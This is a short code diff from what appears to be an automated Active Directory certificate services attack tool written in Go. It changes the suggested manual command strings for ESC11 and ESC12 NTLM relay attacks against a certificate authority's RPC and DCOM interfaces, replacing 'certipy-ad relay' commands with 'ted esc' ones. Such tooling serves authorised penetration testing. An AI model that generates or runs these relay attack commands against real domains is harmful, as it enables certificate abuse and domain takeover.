@@ -354,8 +354,8 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 	// ESC11: NTLM relay to RPC interface (manual)
 	for _, f := range result.ESC11Findings {
 		relayCmd := fmt.Sprintf(
-			"certipy-ad relay -target rpc://%s -ca %q -template <TEMPLATE>",
-			f.CAHostname, f.CAName,
+			"ted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s",
+			f.CAHostname,
 		)
 		candidates = append(candidates, escCandidate{
 			escType: "ESC11", score: 3, templateName: f.CAName,
@@ -367,8 +367,8 @@ func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandida
 	// ESC12: NTLM relay to DCOM interface (manual)
 	for _, f := range result.ESC12Findings {
 		relayCmd := fmt.Sprintf(
-			"certipy-ad relay -target dcom://%s -ca %q -template <TEMPLATE>",
-			f.CAHostname, f.CAName,
+			"ted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s",
+			f.CAHostname,
 		)
 		candidates = append(candidates, escCandidate{
 			escType: "ESC12", score: 3, templateName: f.CAName,
